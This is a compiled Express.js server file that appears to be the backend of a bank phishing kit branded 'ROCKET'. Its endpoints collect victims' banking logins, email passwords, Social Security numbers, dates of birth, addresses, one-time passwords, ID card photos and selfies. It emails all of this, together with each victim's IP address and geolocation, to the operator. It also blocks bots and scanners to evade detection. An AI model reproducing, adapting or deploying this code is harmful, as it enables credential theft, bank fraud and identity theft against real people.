"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importDefault(require("express"));
const express_nobots_1 = __importDefault(require("express-nobots"));
const geoip_lite_1 = __importDefault(require("geoip-lite"));
const mobile_detect_1 = __importDefault(require("mobile-detect"));
const express_formidable_1 = __importDefault(require("express-formidable"));
require("dotenv").config();
const sendEmail_1 = require("./utils/sendEmail");
const path_1 = __importDefault(require("path"));
const app = express_1.default();
app.use(express_formidable_1.default());
const port = process.env.PORT || 5000;
app.use(express_nobots_1.default());
app.use(express_1.default.json());
app.post("/send-session", (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    var _a;
    const md = new mobile_detect_1.default(req.headers["user-agent"]);
    const isBot = md.is("Bot");
    if (isBot) {
        res.send("Fuck off");
        return;
    }
    try {
        const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
        const geo = geoip_lite_1.default.lookup(ip);
        const front = req.files && req.files.front;
        const back = req.files && req.files.back;
        const selfie = req.files && req.files.selfie;
        const values = JSON.parse(req.fields ? req.fields.session : "{}");
        yield sendEmail_1.sendEmail(process.env.TO, `
   <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄BEGIN⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
   <h3><strong>SESSION</strong></h3>
   <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
   <br>
   <h4>LOGIN DETAILS</h4>
   <p>| (▰˘◡˘▰) LOGIN ATTEMPT ☞ <b>${values.logins["1"].loginDetails.loginAttempt}</b></p>
   <p>| (▰˘◡˘▰) EMAIL ☞ <b>${values.logins["1"].loginDetails.email}</b></p>
   <p>| (▰˘◡˘▰) PASSWORD ☞ <b>${values.logins["1"].loginDetails.password}</b></p>
   <br>
   ${values.logins["2"]
            ? `<p>| (▰˘◡˘▰) LOGIN ATTEMPT ☞ <b>${values.logins["2"].loginDetails.loginAttempt}</b></p>
     <p>| (▰˘◡˘▰) EMAIL ☞ <b>${values.logins["2"].loginDetails.email}</b></p>
     <p>| (▰˘◡˘▰) PASSWORD ☞ <b>${values.logins["2"].loginDetails.password}</b></p>
     <br>`
            : ""}
   <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
   <br>
   <h4>EMAIL LOGINS</h4>
   <p>| (▰˘◡˘▰) EMAIL ATTEMPT ☞ <b>${values.emailLogins["1"].emailLogins.attempt}</b></p>
   <p>| (▰˘◡˘▰) EMAIL ADDRESS ☞ <b>${values.emailLogins["1"].emailLogins.email}</b></p>
   <p>| (▰˘◡˘▰) EMAIL PASSWORD ☞ <b>${values.emailLogins["1"].emailLogins.emailPassword}</b></p>
   <br>
   ${values.emailLogins["2"]
            ? `<p>| (▰˘◡˘▰) EMAIL ATTEMPT ☞ <b>${values.emailLogins["2"].emailLogins.attempt}</b></p>
     <p>| (▰˘◡˘▰) EMAIL ADDRESS ☞ <b>${values.emailLogins["2"].emailLogins.email}</b></p>
     <p>| (▰˘◡˘▰) EMAIL PASSWORD ☞ <b>${values.emailLogins["2"].emailLogins.emailPassword}</b></p>
     <br>`
            : ""}
   <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
   <br>
   <h4>BILLING</h4>
   <p>| (▰˘◡˘▰) FIRST NAME ☞ <b>${values.billing.firstname}</b></p>
   <p>| (▰˘◡˘▰) LAST NAME ☞ <b>${values.billing.lastname}</b></p>
   <p>| (▰˘◡˘▰) SSN ☞ <b>${values.billing.ssn}</b></p>
   <p>| (▰˘◡˘▰) DOB ☞ <b>${values.billing.dob}</b></p>
   <p>| (▰˘◡˘▰) STREET ADDRESS ☞ <b>${values.billing.streetAddress}</b></p>
   <p>| (▰˘◡˘▰) ZIP CODE ☞ <b>${values.billing.zipCode}</b></p>
   <p>| (▰˘◡˘▰) STATE ☞ <b>${values.billing.state}</b></p>
   <p>| (▰˘◡˘▰) PHONE NUMBER ☞ <b>${values.billing.phoneNumber}</b></p>
   ${values.billing.balance &&
            `<p>| (▰˘◡˘▰) POTENTIAL BALANCE ☞ <b>${values.billing.balance}</b></p>`}
   <br>
   ${values.otp
            ? `<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
     <br>
     <h4>ONE TIME PASSWORD</h4>
     <p>| (▰˘◡˘▰) OTP ☞ <b>${values.otp}</b></p>
     <br>`
            : ""}
   ${req.files && (req.files.front || req.files.back)
            ? ` <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
     <br>
     <h4>SUPPORTING DOCUMENTS${selfie ? " & SELFIE" : ""}</h4>
     <p>| (▰˘◡˘▰) See attached files</b></p>
     <br>`
            : ""}
   <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
   <br>
   <p>| (▰˘◡˘▰) IP ☞ <b>${ip}</b></p>
   <p>| (▰˘◡˘▰) LOCATION ☞ <b>${geo === null || geo === void 0 ? void 0 : geo.city}, ${geo === null || geo === void 0 ? void 0 : geo.country}</b></p>
   <p>| (▰˘◡˘▰) TIMEZONE ☞ <b>${geo === null || geo === void 0 ? void 0 : geo.timezone}</b></p>
   <p>| (▰˘◡˘▰) USER AGENT ☞ <b>${req.headers["user-agent"]}</b></p>
   <br>
   <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄END⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
   `, `${process.env.BANK_NAME} - ${(_a = req.fields) === null || _a === void 0 ? void 0 : _a.form} by ROCKET 🚀🚀🚀 From ${ip}`, req.files && (req.files.front || req.files.back)
            ? [
                {
                    filename: `Front.${front.type.split("/")[1]}`,
                    content: front,
                },
                {
                    filename: `Back.${back.type.split("/")[1]}`,
                    content: back,
                },
                ...(selfie
                    ? [
                        {
                            filename: `Selfie.${selfie.type.split("/")[1]}`,
                            content: selfie,
                        },
                    ]
                    : []),
            ]
            : []);
    }
    catch (error) {
        console.log(error);
    }
    res.send("OK");
}));
app.post("/send-files", (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    var _b, _c, _d;
    const md = new mobile_detect_1.default(req.headers["user-agent"]);
    const isBot = md.is("Bot");
    if (isBot) {
        res.send("Fuck off");
        return;
    }
    const front = (_b = req.files) === null || _b === void 0 ? void 0 : _b.front;
    const back = (_c = req.files) === null || _c === void 0 ? void 0 : _c.back;
    try {
        const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
        const geo = geoip_lite_1.default.lookup(ip);
        yield sendEmail_1.sendEmail(process.env.TO, `
     <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
     <br>
     <h4>SUPPORTING DOCUMENTS</h4>
     <p>| (▰˘◡˘▰) See attached files</b></p>
     <br>
     <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
     <br>
     <p>| (▰˘◡˘▰) IP ☞ <b>${ip}</b></p>
     <p>| (▰˘◡˘▰) LOCATION ☞ <b>${geo === null || geo === void 0 ? void 0 : geo.city}, ${geo === null || geo === void 0 ? void 0 : geo.country}</b></p>
     <p>| (▰˘◡˘▰) TIMEZONE ☞ <b>${geo === null || geo === void 0 ? void 0 : geo.timezone}</b></p>
     <p>| (▰˘◡˘▰) USER AGENT ☞ <b>${req.headers["user-agent"]}</b></p>
     <br>
     <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄END⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
     `, `${process.env.BANK_NAME} - ${(_d = req.fields) === null || _d === void 0 ? void 0 : _d.form} by ROCKET 🚀🚀🚀 From ${ip}`, [
            {
                filename: `Front.${front.type.split("/")[1]}`,
                content: front,
            },
            {
                filename: `Back.${back.type.split("/")[1]}`,
                content: back,
            },
        ]);
        res.send(Promise.resolve());
    }
    catch (error) {
        console.log(error);
        res.status(500).send("Something went wrong");
    }
}));
app.post("/send-selfie", (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    var _e, _f;
    const md = new mobile_detect_1.default(req.headers["user-agent"]);
    const isBot = md.is("Bot");
    if (isBot) {
        res.send("Fuck off");
        return;
    }
    const selfie = (_e = req.files) === null || _e === void 0 ? void 0 : _e.selfie;
    try {
        const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
        const geo = geoip_lite_1.default.lookup(ip);
        yield sendEmail_1.sendEmail(process.env.TO, `
     <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
     <br>
     <h4>SELFIE</h4>
     <p>| (▰˘◡˘▰) See attached files</b></p>
     <br>
     <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
     <br>
     <p>| (▰˘◡˘▰) IP ☞ <b>${ip}</b></p>
     <p>| (▰˘◡˘▰) LOCATION ☞ <b>${geo === null || geo === void 0 ? void 0 : geo.city}, ${geo === null || geo === void 0 ? void 0 : geo.country}</b></p>
     <p>| (▰˘◡˘▰) TIMEZONE ☞ <b>${geo === null || geo === void 0 ? void 0 : geo.timezone}</b></p>
     <p>| (▰˘◡˘▰) USER AGENT ☞ <b>${req.headers["user-agent"]}</b></p>
     <br>
     <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄END⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
     `, `${process.env.BANK_NAME} - ${(_f = req.fields) === null || _f === void 0 ? void 0 : _f.form} by ROCKET 🚀🚀🚀 From ${ip}`, [
            {
                filename: `Selfie.${selfie.type.split("/")[1]}`,
                content: selfie,
            },
        ]);
        res.send(Promise.resolve());
    }
    catch (error) {
        console.log(error);
        res.status(500).send("Something went wrong");
    }
}));
app.post("/send-infos", (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    const md = new mobile_detect_1.default(req.headers["user-agent"]);
    const isBot = md.is("Bot");
    if (isBot) {
        res.send("Fuck off");
        return;
    }
    try {
        const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
        const geo = geoip_lite_1.default.lookup(ip);
        const values = JSON.parse(Object.keys(req.fields)[0]);
        yield sendEmail_1.sendEmail(process.env.TO, `
     <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄BEGIN⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
     ${values.form === "LOGIN DETAILS"
            ? `
        <br>
        <h4>LOGIN DETAILS</h4>
        <p>| (▰˘◡˘▰) LOGIN ATTEMPT ☞ <b>${values.loginDetails.loginAttempt}</b></p>
        <p>| (▰˘◡˘▰) EMAIL ☞ <b>${values.loginDetails.email}</b></p>
        <p>| (▰˘◡˘▰) PASSWORD ☞ <b>${values.loginDetails.password}</b></p>
        <br>
        `
            : ` ${values.form === "EMAIL LOGINS"
                ? `
         <br>
         <h4>EMAIL LOGINS</h4>
         <p>| (▰˘◡˘▰) EMAIL ATTEMPT ☞ <b>${values.emailLogins.attempt}</b></p>
         <p>| (▰˘◡˘▰) EMAIL ADDRESS ☞ <b>${values.emailLogins.email}</b></p>
         <p>| (▰˘◡˘▰) EMAIL PASSWORD ☞ <b>${values.emailLogins.emailPassword}</b></p>
         `
                : `
     ${values.form === "BILLING"
                    ? `
     <br>
     <h4>BILLING</h4>
     <p>| (▰˘◡˘▰) FIRST NAME ☞ <b>${values.billing.firstname}</b></p>
     <p>| (▰˘◡˘▰) LAST NAME ☞ <b>${values.billing.lastname}</b></p>
     <p>| (▰˘◡˘▰) SSN ☞ <b>${values.billing.ssn}</b></p>
     <p>| (▰˘◡˘▰) DOB ☞ <b>${values.billing.dob}</b></p>
     <p>| (▰˘◡˘▰) STREET ADDRESS ☞ <b>${values.billing.streetAddress}</b></p>
     <p>| (▰˘◡˘▰) SUITE/APT/OTHER ☞ <b>${values.billing.suite}</b></p>
     <p>| (▰˘◡˘▰) ZIP CODE ☞ <b>${values.billing.zipCode}</b></p>
     <p>| (▰˘◡˘▰) STATE ☞ <b>${values.billing.state}</b></p>
     <p>| (▰˘◡˘▰) PHONE NUMBER ☞ <b>${values.billing.phoneNumber}</b></p>
     ${values.billing.balance &&
                        `<p>| (▰˘◡˘▰) POTENTIAL BALANCE ☞ <b>${values.billing.balance}</b></p>`}
     <br>
     `
                    : ` <br>
         <h4>ONE TIME PASSWORD</h4>
         <p>| (▰˘◡˘▰) OTP ☞ <b>${values.otp}</b></p>
         <br>`}`}
     `}
     <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
     <br>
     <p>| (▰˘◡˘▰) IP ☞ <b>${ip}</b></p>
     <p>| (▰˘◡˘▰) LOCATION ☞ <b>${geo === null || geo === void 0 ? void 0 : geo.city}, ${geo === null || geo === void 0 ? void 0 : geo.country}</b></p>
     <p>| (▰˘◡˘▰) TIMEZONE ☞ <b>${geo === null || geo === void 0 ? void 0 : geo.timezone}</b></p>
     <p>| (▰˘◡˘▰) USER AGENT ☞ <b>${req.headers["user-agent"]}</b></p>
     <br>
     <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄END⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
     `, `${process.env.BANK_NAME} - ${values.form} by ROCKET 🚀🚀🚀 From ${ip}`);
        res.send(Promise.resolve());
    }
    catch (error) {
        res.status(500).send("Something went wrong");
    }
}));
app.use(express_1.default.static(path_1.default.join(__dirname, "../build")));
app.get("/-", (req, res) => {
    const md = new mobile_detect_1.default(req.headers["user-agent"]);
    const isBot = md.is("Bot");
    if (isBot) {
        res.send("Fuck off");
        return;
    }
    res.sendFile(path_1.default.join(__dirname, "../build", "index.html"));
});
app.listen(port, () => {
    console.log(`Listening on http://localhost:${port}`);
});
//# sourceMappingURL=index.js.map